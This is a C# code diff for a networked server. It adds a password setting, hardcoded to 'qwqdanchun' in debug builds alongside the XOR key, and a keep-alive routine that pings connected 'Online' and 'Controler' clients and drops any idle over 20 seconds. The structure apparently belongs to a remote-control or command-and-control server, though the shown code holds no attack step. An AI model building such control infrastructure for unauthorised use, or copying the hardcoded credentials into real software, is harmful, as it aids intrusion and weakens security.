@@ -13,15 +13,15 @@ namespace Server
         {
 #if DEBUG
             Settings.XorKey = "qwqdanchun";
+            Settings.Password = "qwqdanchun";
             Settings.Port = 8848;
 #else
             Settings.XorKey = args[1];
+            Settings.Password = args[2];
             Settings.Port = Convert.ToInt32(args[0]);
 #endif
             Listener listener = new Listener();
             await Task.Run(() => listener.Connect());
-            //Thread thread = new Thread(new ThreadStart(listener.Connect));
-            //thread.Start();
             tim.Elapsed += Tim_Elapsed;
             tim.Start();
             while (true)
@@ -36,10 +36,32 @@ namespace Server
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "Ping";
-                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                 foreach (Clients CL in Settings.Online.ToList())
                 {
-                    ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    if (Helper.DiffSeconds(CL.LastPing, DateTime.Now) > 20)
+                    {
+                        CL.Disconnected();
+                    }
+                    else
+                    {
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    }                    
+                }
+            }
+            if (Settings.Controler.Count > 0)
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                foreach (Clients CL in Settings.Controler.ToList())
+                {
+                    if (Helper.DiffSeconds(CL.LastPing, DateTime.Now) > 20)
+                    {
+                        CL.Disconnected();
+                    }
+                    else
+                    {
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    }                    
                 }
             }
         }
